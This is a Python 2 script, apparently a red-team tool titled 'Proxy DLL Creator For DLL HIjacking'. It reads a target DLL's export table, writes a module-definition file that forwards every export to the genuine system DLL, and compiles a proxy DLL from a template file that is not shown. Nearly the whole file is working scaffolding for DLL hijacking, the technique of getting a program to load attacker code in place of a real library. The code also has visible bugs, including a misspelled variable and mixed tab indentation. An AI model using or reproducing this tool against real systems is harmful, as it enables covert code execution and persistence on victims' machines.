#!/usr/bin/python

import sys, pefile, os
from time import sleep

def create_def(dllname,arch):
    if arch == "x86":
        newdllname = "c://windows//syswow64//"+dllname.replace(".dll","")
    else:
        newdllname = "c://windows//system32//"+dllname.replace(".dll","")

    pe = pefile.PE(dllname)

    if not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT') :
	print "No Export table! Is this a DLL?? "
	sys.exit(-1)

    f = open("export.def","w")
    f.write("LIBRARY \"" + dllname.replace(".dll","") + "\"\n")
    f.write("EXPORTS\n\n")
    f.close()
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name :
            f = open('export.def','a')
            f.write("%s=%s.%s @%d\n" % (exp.name, newdllname, exp.name, exp.ordinal))
            f.close()
        else :
            f = open('export.def','a')
            f.write("ord%d=%s.ord%d @%d NONAME\n" %(exp.ordinal, newdllName, exp.ordinal, exp.ordinal))
            f.close()
    print("[*] Defination File Created with name of export.def\n")
    sleep(1)

def check_arch(dllname):
    global arch
    pe = pefile.PE(dllname)
    if hex(pe.FILE_HEADER.Machine) == '0x14c':
        arch = "x86"
        print("[*] DLL is 32bit \n")
        sleep(1)
    else:
        arch = "x64"
        print("[*] DLL is 64bit \n")
        sleep(1)

def compile_dll(dllname,arch):
    if arch == "x86":
        os.system("/usr/bin/i686-w64-mingw32-gcc template.c -shared -o "+dllname.replace(".dll","_proxy.dll")+" export.def")
        print("[*] Created 32bit DLL : "+dllname.replace(".dll","_proxy.dll"))
    else:
        os.system("/usr/bin/x86_64-w64-mingw32-gcc template_64.c -shared -o "+dllname.replace(".dll","_proxy.dll")+" export.def")
        print("[*] Created 64bit DLL : "+dllname.replace(".dll","_proxy.dll"))


def banner():
    from termcolor import colored
    from colorama import init
    #print(Fore.Red  'Proxy DLL Creator For DLL HIjacking ')
    print(colored('\nProxy DLL Creator For DLL HIjacking\n\t\t By \n\t   Rikunj Sindhwad \n\t     [Mr.R0b07]\n' , 'green' ))


def main():
    check_arch(sys.argv[1])
    create_def(sys.argv[1],arch)
    compile_dll(sys.argv[1],arch)

if __name__ == "__main__":
    banner()
    sleep(1)
    if len(sys.argv) < 2:
	print "\nUsage: " + sys.argv[0] + " 'DLL File Location' \n"
	print "Usage: " + sys.argv[0] + " '/home/kali/xyz/abc.dll' \n"
	sys.exit()
    else:
        main()


